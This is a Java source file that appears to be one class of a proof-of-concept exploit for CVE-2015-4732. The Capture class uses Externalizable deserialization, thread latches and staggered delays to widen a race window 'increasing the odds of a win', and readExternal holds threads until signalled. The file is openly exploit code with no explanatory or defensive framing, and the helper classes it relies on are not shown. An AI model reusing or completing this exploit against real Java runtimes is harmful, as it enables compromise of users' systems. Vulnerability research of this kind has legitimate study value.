package poc.cve_2015_4732;

import java.io.Externalizable;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.util.concurrent.CountDownLatch;

import poc.cve_2015_4732.EXTThread.State;

public class Capture implements Externalizable {
	
	public static CountDownLatch CDL;
	
	public int val;
	
	public Capture( ) throws InterruptedException {
		final EXTThread curThread = ( EXTThread ) Thread.currentThread();
		final int delay = curThread.threadID * 500;
		
		curThread.setState( State.EXT_CON_HOLD );
		Capture.CDL.await();
		curThread.setState( State.EXT_CON_CONT );
		
		// Add a small amount of delay between each thread.
		//  It's not really needed but increases the spread
		//  between threads increasing the odds of a win.
		int a = 0;
		for( int i = 0; i < delay; i++ ) {
			a += i;
		}
		this.val = a;
	}
	
	@Override
	public void writeExternal( ObjectOutput out ) throws IOException { }
	
	@Override
	public void readExternal( ObjectInput in ) throws IOException, ClassNotFoundException {
		final EXTThread curThread = ( EXTThread ) Thread.currentThread();
		
		curThread.setState( State.EXT_READ_HOLD );
		curThread.waitForState( State.EXT_READ_CONT );
		
		throw new AssertionError( "RETURN" );
	}
	
}
